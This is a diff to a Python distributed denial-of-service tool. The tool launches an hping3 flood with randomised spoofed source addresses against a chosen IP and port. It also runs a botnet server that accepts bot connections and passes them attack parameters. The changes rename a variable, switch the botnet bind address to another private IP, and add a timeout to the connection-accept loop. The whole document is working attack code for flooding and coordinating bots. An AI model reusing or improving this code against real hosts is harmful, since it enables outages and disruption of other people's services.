@@ -20,18 +20,18 @@ def DDOSAttack():
     bots = threading.Thread(target=botnet, args=(ipAddress, portNumber, packetSize, attackType, duration))
     bots.start()
 
-    dosCommand = subprocess.Popen(
+    ddosCommand = subprocess.Popen(
         ['sudo', 'hping3', attackType, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress],
         stdout=subprocess.PIPE,
         text=True)
     time.sleep(duration) # carry out attack for specified duration
 
     try:
-        dosCommand.send_signal(signal.SIGINT) # Send CTRL+c to kill the child process
+        ddosCommand.send_signal(signal.SIGINT) # Send CTRL+c to kill the child process
     except subprocess.TimeoutExpired:
         print('Timeout occured')
     
-    dosCommand.kill()
+    ddosCommand.kill()
     bots.join()
     return ""
 
@@ -68,7 +68,7 @@ def send_commands(conn, ipAddress, portNumber, packetSize, attackType, duration)
 def botnet(ipAddress, portNumber, packetSize, attackType, duration):
     # hostname=socket.gethostname()   
     # bindIp=socket.gethostbyname(hostname)   
-    bindIp="192.168.6.22"
+    bindIp="192.168.1.34"
     bindPort = 1046
     servAdd = (bindIp, bindPort)
     
@@ -85,13 +85,17 @@ def botnet(ipAddress, portNumber, packetSize, attackType, duration):
     start_time = time.time()  # Record the start time
 
     while (time.time() - start_time) < duration:
-        conn, addr = server.accept() # accept the connection
-        
-        # Create a new thread to handle the connection
-        client_thread = threading.Thread(target=handle_client, args=(conn, addr, ipAddress, portNumber, packetSize, attackType, duration))
-        client_thread.start()
-        
-        threads.append(client_thread) # Store the thread in the list
+        try:
+            server.settimeout(duration - (time.time() - start_time))
+            conn, addr = server.accept() # accept the connection
+            
+            # Create a new thread to handle the connection
+            client_thread = threading.Thread(target=handle_client, args=(conn, addr, ipAddress, portNumber, packetSize, attackType, duration))
+            client_thread.start()
+            
+            threads.append(client_thread) # Store the thread in the list
+        except socket.timeout:
+            pass
 
     # Wait for all threads to finish
     for thread in threads:
